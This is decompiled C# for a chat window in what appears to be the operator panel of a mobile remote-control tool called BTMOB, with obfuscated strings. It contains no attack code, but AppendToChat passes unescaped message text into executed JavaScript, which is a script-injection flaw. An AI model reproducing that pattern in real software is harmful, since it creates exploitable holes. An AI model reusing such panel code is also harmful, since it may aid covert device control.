using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Web.WebView2.Core;
using Microsoft.Web.WebView2.WinForms;

namespace BTMOB;

[DesignerGenerated]
public class Chat : Form
{
	[ComVisible(true)]
	public class mybridge
	{
		public Chat mainform;

		public mybridge(Chat minme)
		{
			mainform = minme;
		}

		[DispId(1)]
		public object sendit(string msg)
		{
			mainform.sendtoclient(msg);
			return "";
		}

		public object closeme()
		{
			mainform.Close();
			return "";
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("statetimer")]
	private Timer _statetimer;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Chatview")]
	private WebView2 _Chatview;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("myico")]
	private PictureBox _myico;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mytitle")]
	private Label _mytitle;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("closbtn")]
	private DrakeUIButtonIcon _closbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon2;

	private string adminname;

	public BTClient Btcli;

	internal virtual Timer statetimer
	{
		[CompilerGenerated]
		get
		{
			return _statetimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = statetimer_Tick;
			Timer timer = _statetimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_statetimer = value;
			timer = _statetimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	internal virtual WebView2 Chatview
	{
		[CompilerGenerated]
		get
		{
			return _Chatview;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			KeyEventHandler value2 = Chatview_KeyDown;
			WebView2 webView = _Chatview;
			if (webView != null)
			{
				webView.KeyDown -= value2;
			}
			_Chatview = value;
			webView = _Chatview;
			if (webView != null)
			{
				webView.KeyDown += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W5")]
	internal virtual DrakeWidth_W DrakeWidth_W5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W8")]
	internal virtual DrakeWidth_W DrakeWidth_W8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W6")]
	internal virtual DrakeWidth_W DrakeWidth_W6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W7")]
	internal virtual DrakeWidth_W DrakeWidth_W7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual PictureBox myico
	{
		[CompilerGenerated]
		get
		{
			return _myico;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = mytitle_MouseDown;
			PictureBox pictureBox = _myico;
			if (pictureBox != null)
			{
				pictureBox.MouseDown -= value2;
			}
			_myico = value;
			pictureBox = _myico;
			if (pictureBox != null)
			{
				pictureBox.MouseDown += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W2")]
	internal virtual DrakeWidth_W DrakeWidth_W2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public virtual Label mytitle
	{
		[CompilerGenerated]
		get
		{
			return _mytitle;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = mytitle_MouseDown;
			Label label = _mytitle;
			if (label != null)
			{
				label.MouseDown -= value2;
			}
			_mytitle = value;
			label = _mytitle;
			if (label != null)
			{
				label.MouseDown += value2;
			}
		}
	}

	public virtual DrakeUIButtonIcon closbtn
	{
		[CompilerGenerated]
		get
		{
			return _closbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = closbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _closbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_closbtn = value;
			drakeUIButtonIcon = _closbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	public virtual DrakeUIButtonIcon DrakeUIButtonIcon2
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon2_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon2 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.Chat));
		this.statetimer = new System.Windows.Forms.Timer(this.components);
		this.Chatview = new Microsoft.Web.WebView2.WinForms.WebView2();
		this.DrakeWidth_W5 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeWidth_W8 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeWidth_W6 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeWidth_W7 = new DrakeUI.Framework.DrakeWidth_W();
		this.Panel1 = new System.Windows.Forms.Panel();
		this.DrakeUIButtonIcon2 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.mytitle = new System.Windows.Forms.Label();
		this.myico = new System.Windows.Forms.PictureBox();
		this.DrakeWidth_W2 = new DrakeUI.Framework.DrakeWidth_W();
		this.closbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		((System.ComponentModel.ISupportInitialize)this.Chatview).BeginInit();
		this.Panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		base.SuspendLayout();
		this.Chatview.AllowExternalDrop = true;
		this.Chatview.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Chatview.CreationProperties = null;
		this.Chatview.DefaultBackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Chatview.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Chatview.ForeColor = System.Drawing.Color.White;
		this.Chatview.Location = new System.Drawing.Point(2, 52);
		this.Chatview.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.Chatview.Name = EXGuarder._3B66704D;
		this.Chatview.Size = new System.Drawing.Size(448, 942);
		this.Chatview.TabIndex = 41;
		this.Chatview.ZoomFactor = 1.0;
		this.DrakeWidth_W5.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
		this.DrakeWidth_W5.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W5.Location = new System.Drawing.Point(0, 2);
		this.DrakeWidth_W5.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.DrakeWidth_W5.Name = EXGuarder._58130902;
		this.DrakeWidth_W5.Size = new System.Drawing.Size(2, 992);
		this.DrakeWidth_W5.TabIndex = 45;
		this.DrakeWidth_W8.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
		this.DrakeWidth_W8.Cursor = System.Windows.Forms.Cursors.SizeNS;
		this.DrakeWidth_W8.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.DrakeWidth_W8.Location = new System.Drawing.Point(0, 994);
		this.DrakeWidth_W8.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.DrakeWidth_W8.Name = EXGuarder._4B6E392C;
		this.DrakeWidth_W8.Size = new System.Drawing.Size(450, 2);
		this.DrakeWidth_W8.TabIndex = 44;
		this.DrakeWidth_W6.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
		this.DrakeWidth_W6.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W6.Location = new System.Drawing.Point(0, 0);
		this.DrakeWidth_W6.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.DrakeWidth_W6.Name = EXGuarder._0E54525D;
		this.DrakeWidth_W6.Size = new System.Drawing.Size(450, 2);
		this.DrakeWidth_W6.TabIndex = 43;
		this.DrakeWidth_W7.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
		this.DrakeWidth_W7.Cursor = System.Windows.Forms.Cursors.SizeWE;
		this.DrakeWidth_W7.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W7.Location = new System.Drawing.Point(450, 0);
		this.DrakeWidth_W7.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.DrakeWidth_W7.Name = EXGuarder._12492425;
		this.DrakeWidth_W7.Size = new System.Drawing.Size(2, 996);
		this.DrakeWidth_W7.TabIndex = 42;
		this.Panel1.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel1.Controls.Add(this.DrakeUIButtonIcon2);
		this.Panel1.Controls.Add(this.mytitle);
		this.Panel1.Controls.Add(this.myico);
		this.Panel1.Controls.Add(this.DrakeWidth_W2);
		this.Panel1.Controls.Add(this.closbtn);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel1.Location = new System.Drawing.Point(2, 2);
		this.Panel1.Name = EXGuarder._70246775;
		this.Panel1.Padding = new System.Windows.Forms.Padding(5);
		this.Panel1.Size = new System.Drawing.Size(448, 50);
		this.Panel1.TabIndex = 47;
		this.DrakeUIButtonIcon2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon2.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon2.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeUIButtonIcon2.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon2.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon2.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon2.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon2.Font = new System.Drawing.Font(EXGuarder._78573774, 12f);
		this.DrakeUIButtonIcon2.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.DrakeUIButtonIcon2.ForeDisableColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon2.ForeHoverColor = System.Drawing.Color.Red;
		this.DrakeUIButtonIcon2.Location = new System.Drawing.Point(359, 5);
		this.DrakeUIButtonIcon2.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.DrakeUIButtonIcon2.Name = EXGuarder._5D44523D;
		this.DrakeUIButtonIcon2.Radius = 15;
		this.DrakeUIButtonIcon2.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.DrakeUIButtonIcon2.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.DrakeUIButtonIcon2.RectDisableColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon2.RectHoverColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon2.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon2.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon2.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.DrakeUIButtonIcon2.Size = new System.Drawing.Size(37, 40);
		this.DrakeUIButtonIcon2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon2.Symbol = 61741;
		this.DrakeUIButtonIcon2.SymbolSize = 20;
		this.DrakeUIButtonIcon2.TabIndex = 52;
		this.mytitle.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.mytitle.Dock = System.Windows.Forms.DockStyle.Fill;
		this.mytitle.Font = new System.Drawing.Font(EXGuarder._78573774, 8f);
		this.mytitle.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
		this.mytitle.Location = new System.Drawing.Point(53, 5);
		this.mytitle.Name = EXGuarder._191B115B;
		this.mytitle.Size = new System.Drawing.Size(343, 40);
		this.mytitle.TabIndex = 50;
		this.mytitle.Text = EXGuarder._5865410F;
		this.mytitle.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.myico.Dock = System.Windows.Forms.DockStyle.Left;
		this.myico.Location = new System.Drawing.Point(5, 5);
		this.myico.Name = EXGuarder._23610D23;
		this.myico.Size = new System.Drawing.Size(48, 40);
		this.myico.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.myico.TabIndex = 48;
		this.myico.TabStop = false;
		this.DrakeWidth_W2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W2.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W2.Location = new System.Drawing.Point(396, 5);
		this.DrakeWidth_W2.Name = EXGuarder._2F752427;
		this.DrakeWidth_W2.Size = new System.Drawing.Size(10, 40);
		this.DrakeWidth_W2.TabIndex = 49;
		this.closbtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.closbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.closbtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.Font = new System.Drawing.Font(EXGuarder._78573774, 12f);
		this.closbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.closbtn.ForeDisableColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.closbtn.ForeHoverColor = System.Drawing.Color.Red;
		this.closbtn.Location = new System.Drawing.Point(406, 5);
		this.closbtn.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.closbtn.Name = EXGuarder._46076274;
		this.closbtn.Radius = 15;
		this.closbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.closbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.closbtn.RectDisableColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.closbtn.RectHoverColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.closbtn.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.closbtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.closbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.closbtn.Size = new System.Drawing.Size(37, 40);
		this.closbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.closbtn.Symbol = 61453;
		this.closbtn.SymbolSize = 19;
		this.closbtn.TabIndex = 51;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.AutoScroll = true;
		base.ClientSize = new System.Drawing.Size(452, 996);
		base.Controls.Add(this.Chatview);
		base.Controls.Add(this.Panel1);
		base.Controls.Add(this.DrakeWidth_W5);
		base.Controls.Add(this.DrakeWidth_W8);
		base.Controls.Add(this.DrakeWidth_W6);
		base.Controls.Add(this.DrakeWidth_W7);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._3737593A);
		base.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.MinimumSize = new System.Drawing.Size(452, 47);
		base.Name = EXGuarder._793D3743;
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = EXGuarder._793D3743;
		((System.ComponentModel.ISupportInitialize)this.Chatview).EndInit();
		this.Panel1.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		base.ResumeLayout(false);
	}

	public Chat(string title)
	{
		base.Load += Chat_Load;
		adminname = null;
		Btcli = null;
		InitializeComponent();
		adminname = title;
	}

	public async void AppendToChat(bool isFromClient, string message)
	{
		if (isFromClient)
		{
			await Chatview.CoreWebView2.ExecuteScriptAsync($"insertReceiverMessage(`{message}`);");
		}
		else
		{
			await Chatview.CoreWebView2.ExecuteScriptAsync($"insertSenderMessage(`{message}`);");
		}
	}

	private void sendtoclient(string themsg)
	{
		if (!codes.StrisEmpty(themsg))
		{
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add(EXGuarder._7714162E, EXGuarder._3D033035);
			dictionary.Add(EXGuarder._5D306C23, themsg);
			dictionary.Add(EXGuarder._15616D41, adminname);
			Dictionary<string, object> chatData = dictionary;
			BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			AppendToChat(isFromClient: false, themsg);
		}
	}

	private async void Chat_Load(object sender, EventArgs e)
	{
		await Chatview.EnsureCoreWebView2Async();
		Chatview.NavigationCompleted += WebView_NavigationCompleted;
		Chatview.NavigateToString(Resources.btchat);
		mybridge rawObject = new mybridge(this);
		Chatview.CoreWebView2.AddHostObjectToScript("mybridge", rawObject);
		Chatview.CoreWebView2.Settings.AreDefaultContextMenusEnabled = false;
		Chatview.CoreWebView2.Settings.AreDevToolsEnabled = false;
		myico.Image = Btcli.wallpaper;
		mytitle.Text = Btcli.name;
		statetimer.Start();
	}

	private async void WebView_NavigationCompleted(object sender, CoreWebView2NavigationCompletedEventArgs e)
	{
	}

	private void statetimer_Tick(object sender, EventArgs e)
	{
		try
		{
			if (Btcli.isConnected)
			{
				myico.Image = Btcli.wallpaper;
				mytitle.Text = Btcli.name;
			}
			else
			{
				myico.Image = Resources.no_con;
				mytitle.Text = BTConst.Disconnectedstr;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private async void Chatview_KeyDown(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Return)
		{
			e.SuppressKeyPress = true;
			await Chatview.CoreWebView2.ExecuteScriptAsync("sendMessage();");
		}
	}

	private void mytitle_MouseDown(object sender, MouseEventArgs e)
	{
		try
		{
			if (e.Button == MouseButtons.Left)
			{
				Nativz.ReleaseCapture();
				Nativz.SendMessage(base.Handle, 161, 2, 0);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void closbtn_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		Chatview.CoreWebView2.ExecuteScriptAsync(EXGuarder._28082967);
	}
}
